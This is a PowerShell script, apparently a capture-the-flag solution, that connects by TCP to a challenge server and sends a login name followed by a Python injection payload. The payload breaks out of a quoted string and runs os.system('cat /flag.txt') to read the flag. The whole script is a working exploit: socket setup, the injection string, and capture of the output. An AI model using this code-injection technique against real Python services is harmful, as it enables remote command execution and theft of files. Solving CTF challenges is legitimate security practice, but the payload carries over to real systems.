param(
    [string]$HostName = 'c1.arena.airoverflow.com',
    [int]$Port = 56324
)

$ErrorActionPreference = 'Stop'

$client = [System.Net.Sockets.TcpClient]::new()
$client.NoDelay = $true
$client.Connect($HostName, $Port)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream,[System.Text.Encoding]::UTF8)
$writer = New-Object System.IO.StreamWriter($stream,[System.Text.Encoding]::UTF8)
$writer.AutoFlush = $true

Start-Sleep -Milliseconds 800
# Send username first
$writer.WriteLine('bob')
Start-Sleep -Milliseconds 300

# Injection payload to break out of the quoted string and execute os.system to read the flag
$payload = '") or __import__(''os'').system(''cat /flag.txt'') or True or ("'
$writer.WriteLine($payload)

# Collect output for a few seconds
$resultBuilder = New-Object System.Text.StringBuilder
$deadline = [DateTime]::UtcNow.AddSeconds(6)
while ([DateTime]::UtcNow -lt $deadline) {
    if ($stream.DataAvailable) {
        $line = $reader.ReadLine()
        if ($null -ne $line) { [void]$resultBuilder.AppendLine($line) }
    } else {
        Start-Sleep -Milliseconds 80
    }
}

try { $client.Close() } catch {}

$result = $resultBuilder.ToString()
if (-not $result) { $result = '[No output captured]' }
$result
